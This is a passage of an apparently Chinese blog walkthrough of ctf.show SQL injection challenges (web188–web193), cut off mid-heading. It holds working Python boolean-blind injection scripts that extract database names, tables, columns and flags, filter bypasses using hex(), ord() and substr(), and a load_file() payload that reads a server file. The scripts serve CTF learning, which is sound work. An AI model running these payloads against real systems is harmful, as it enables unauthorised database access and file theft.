  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//密码检测</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//密码判断</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">      <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再观察查询语句发现username用{}包裹，即不用考虑闭合</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218135524917.png" alt="image-20241218135524917"></p><p>由MD5弱比较(见web187)得，当输入username和password为0时，会匹配所有开头为0或字母的用户，因此直接均输入0则登录成功</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218142933699.png" alt="image-20241218142933699"></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="web189-读文件中字符"><a href="#web189-读文件中字符" class="headerlink" title="web189(读文件中字符)"></a>web189(读文件中字符)</h2><h3 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h3><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218150052849.png" alt="image-20241218150052849"></p><p>依旧进行上题的尝试均传入0，但是提示密码错误，那就说明存在用户但是密码不对;username传入1，password传入0时提示查询失败，那就说明用户不存在。题目提示flag在api&#x2F;index.php文件中，即使用盲注，贴个脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#import time</span></span><br><span class="line"><span class="comment">#因为环境问题有时候会有网络延迟导致脚本判断出错，加上时间延迟这样可以保证脚本跑出来的数据不会出错</span></span><br><span class="line">url = <span class="string">&quot;http://64c78e0d-d38a-468b-b869-a95fa43912ca.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;&lt;&gt;$=,;_ &#x27;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 这个位置，是群主耗费很长时间跑出来的位置~(未知文件中flag位置，只能通过测试)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>, <span class="number">257</span> + <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;x&#125;</span>&#x27;,1,0)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># time.sleep(0.3)</span></span><br><span class="line">        <span class="comment"># 8d25是username=1时的页面返回内容包含的，具体可以看下面的截图~</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;8d25&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;++++++++++++++++++ <span class="subst">&#123;x&#125;</span> is right&quot;</span>)</span><br><span class="line">            flag += x</span><br><span class="line">            <span class="built_in">print</span>(flag)  <span class="comment"># 确保缩进正确</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:  <span class="comment"># 判断 flag 是否获取完整</span></span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218151651826.png" alt="image-20241218151651826"></p><p>运行该脚本获得flag</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218152126369.png" alt="image-20241218152126369"></p><h3 id="补充-load-file-函数"><a href="#补充-load-file-函数" class="headerlink" title="补充:load_file()函数"></a>补充:load_file()函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#语法</span><br><span class="line">load_file(file_name)</span><br><span class="line">可以返回指定文件的内容，前提是 MySQL 用户具有访问该文件的权限，并且 MySQL 服务器能够读取该文件。</span><br><span class="line">file_name：要读取的文件的完整路径，通常需要用单引号括起来，例如 <span class="string">&#x27;C:/path/to/file.txt&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="web190-无过滤"><a href="#web190-无过滤" class="headerlink" title="web190(无过滤)"></a>web190(无过滤)</h2><p>先随便输入一个username&#x3D;admin,password&#x3D;1,显示密码错误，说明有admin这个用户但是密码不对，如果输入的是username&#x3D;1,password&#x3D;1,显示用户不存在，说明可用admin这个用户来构造payload</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241222185439017.png" alt="image-20241222185439017"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241222185451314.png" alt="image-20241222185451314"></p><p>构造payload来进行测试，已知库名为ctfshow_web，长度为11，注意这里注释符仅可以使用#,如果是%23，–+都不行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and length(database())=11#显示密码错误</span><br><span class="line">admin&#x27; and length(database())=12#显示用户不存在</span><br></pre></td></tr></table></figure><p>通过布尔盲注脚本，进行注入</p><p>爆库名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://0e98cf1d-6b5d-42d6-bf2e-aaf371ac4a82.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">database_name =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;admin&#x27; and ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            database_name += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(database_name)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;数据库名字为:  &#x27;</span>+ <span class="built_in">str</span>(database_name))</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://0e98cf1d-6b5d-42d6-bf2e-aaf371ac4a82.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">table_name =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;admin&#x27; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),<span class="subst">&#123;i&#125;</span>,1))=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            table_name += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(table_name)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;数据表名字为:  &#x27;</span>+ <span class="built_in">str</span>(table_name))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241228002657444.png" alt="image-20241228002657444"></p><p>爆列名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://0e98cf1d-6b5d-42d6-bf2e-aaf371ac4a82.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">column_name =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;admin&#x27; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),<span class="subst">&#123;i&#125;</span>,1))=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            column_name += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(column_name)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;列名为:  &#x27;</span>+ <span class="built_in">str</span>(column_name))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241228003205980.png" alt="image-20241228003205980"></p><p>爆数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://0e98cf1d-6b5d-42d6-bf2e-aaf371ac4a82.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;admin&#x27; and ascii(substr((select f1ag from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1))=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;<span class="comment">#注意username中列名是f1ag,不是flag</span></span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag为:  &#x27;</span>+ <span class="built_in">str</span>(flag))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241228003921927.png" alt="image-20241228003921927"></p><h2 id="web191-过滤ascii"><a href="#web191-过滤ascii" class="headerlink" title="web191(过滤ascii)"></a>web191(过滤ascii)</h2><h3 id="法一-hex"><a href="#法一-hex" class="headerlink" title="法一:hex()"></a>法一:hex()</h3><p>较上题过滤了ascii()函数，可通过hex绕过，注入思路相同，直接上脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://4402baeb-90a2-44d9-a577-ebf18276c195.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag_name =<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">hex_values = [</span><br><span class="line">    <span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;21&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;23&#x27;</span>, <span class="string">&#x27;24&#x27;</span>, <span class="string">&#x27;25&#x27;</span>, <span class="string">&#x27;26&#x27;</span>, <span class="string">&#x27;27&#x27;</span>, <span class="string">&#x27;28&#x27;</span>, <span class="string">&#x27;29&#x27;</span>, <span class="string">&#x27;2A&#x27;</span>, <span class="string">&#x27;2B&#x27;</span>, <span class="string">&#x27;2C&#x27;</span>, <span class="string">&#x27;2D&#x27;</span>, <span class="string">&#x27;2E&#x27;</span>, <span class="string">&#x27;2F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;31&#x27;</span>, <span class="string">&#x27;32&#x27;</span>, <span class="string">&#x27;33&#x27;</span>, <span class="string">&#x27;34&#x27;</span>, <span class="string">&#x27;35&#x27;</span>, <span class="string">&#x27;36&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;38&#x27;</span>, <span class="string">&#x27;39&#x27;</span>, <span class="string">&#x27;3A&#x27;</span>, <span class="string">&#x27;3B&#x27;</span>, <span class="string">&#x27;3C&#x27;</span>, <span class="string">&#x27;3D&#x27;</span>, <span class="string">&#x27;3E&#x27;</span>, <span class="string">&#x27;3F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;41&#x27;</span>, <span class="string">&#x27;42&#x27;</span>, <span class="string">&#x27;43&#x27;</span>, <span class="string">&#x27;44&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;47&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;4A&#x27;</span>, <span class="string">&#x27;4B&#x27;</span>, <span class="string">&#x27;4C&#x27;</span>, <span class="string">&#x27;4D&#x27;</span>, <span class="string">&#x27;4E&#x27;</span>, <span class="string">&#x27;4F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;53&#x27;</span>, <span class="string">&#x27;54&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;56&#x27;</span>, <span class="string">&#x27;57&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;59&#x27;</span>, <span class="string">&#x27;5A&#x27;</span>, <span class="string">&#x27;5B&#x27;</span>, <span class="string">&#x27;5C&#x27;</span>, <span class="string">&#x27;5D&#x27;</span>, <span class="string">&#x27;5E&#x27;</span>, <span class="string">&#x27;5F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;61&#x27;</span>, <span class="string">&#x27;62&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;69&#x27;</span>, <span class="string">&#x27;6A&#x27;</span>, <span class="string">&#x27;6B&#x27;</span>, <span class="string">&#x27;6C&#x27;</span>, <span class="string">&#x27;6D&#x27;</span>, <span class="string">&#x27;6E&#x27;</span>, <span class="string">&#x27;6F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;71&#x27;</span>, <span class="string">&#x27;72&#x27;</span>, <span class="string">&#x27;73&#x27;</span>, <span class="string">&#x27;74&#x27;</span>, <span class="string">&#x27;75&#x27;</span>, <span class="string">&#x27;76&#x27;</span>, <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;7A&#x27;</span>, <span class="string">&#x27;7B&#x27;</span>, <span class="string">&#x27;7C&#x27;</span>, <span class="string">&#x27;7D&#x27;</span>, <span class="string">&#x27;7E&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> hex_values:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;admin&#x27; and hex(substr((select f1ag from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1))=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_name += <span class="built_in">str</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag_name)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">byte_data = <span class="built_in">bytes</span>.fromhex(flag_name)</span><br><span class="line">string_data = byte_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 使用适当的编码方式</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag为:  &#x27;</span>+ string_data)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241228155052157.png" alt="image-20241228155052157"></p><hr><h3 id="法二-ord"><a href="#法二-ord" class="headerlink" title="法二:ord()"></a>法二:ord()</h3><p>看蒙师傅博客还看到了ord函数，但是ord()主要用于MySQL数据库，且对于多字节字符（如 Unicode），返回值可以超出 127，具体取决于字符的编码方式（如 UTF-8）。直接贴个脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://19eb41d0-6b68-4ab3-9259-9515d5d6d490.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag_name =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;admin&#x27; and ord(substr((select f1ag from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1))=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_name += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag_name)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag为:  &#x27;</span>+ <span class="built_in">str</span>(flag_name))</span><br></pre></td></tr></table></figure><h2 id="web192-过滤-ord-hex"><a href="#web192-过滤-ord-hex" class="headerlink" title="web192(过滤+ord,hex)"></a>web192(过滤+ord,hex)</h2><h3 id="补充-substr"><a href="#补充-substr" class="headerlink" title="补充:substr()"></a>补充:substr()</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>用于从字符串中提取子字符串</p><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">SUBSTR(string, start_position, length)</span><br></pre></td></tr></table></figure><ul><li><code>string</code>: 要从中提取子字符串的源字符串。</li><li><code>start_position</code>: 子字符串的起始位置。正数表示从左开始，负数表示从右开始。</li><li><code>length(可选)</code>: 提取的字符数。如果省略，则提取到字符串末尾。</li></ul><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;Hello World&#x27;</span>, <span class="number">7</span>);       <span class="comment">-- 输出: &#x27;World&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;Hello World&#x27;</span>, <span class="number">-5</span>);      <span class="comment">-- 输出: &#x27;World&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;Hello World&#x27;</span>, <span class="number">3</span>, <span class="number">4</span>);    <span class="comment">-- 输出: &#x27;lo W&#x27;</span></span><br></pre></td></tr></table></figure><hr><h3 id="注入过程-1"><a href="#注入过程-1" class="headerlink" title="注入过程"></a>注入过程</h3><p>通过截取字符串substr()函数来进行注入，直接脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://d3aa66d6-039b-43c6-84c3-aebdeea061ed.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag_name =<span class="string">&quot;&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789_&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;admin&#x27; and substr((select f1ag from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_name += j</span><br><span class="line">            <span class="built_in">print</span>(flag_name)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag为: &#x27;</span>+ <span class="built_in">str</span>(flag_name))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241228161619697.png" alt="image-20241228161619697"></p><h2 id="web193-过滤-substr"><a href="#web193-过滤-substr" class="headerlink" title="web193(过滤+substr)"></a>web193(过滤+substr)</h2><h3 id="补充-substr-替换函数"><a href="#补充-substr-替换函数" class="headerlink" 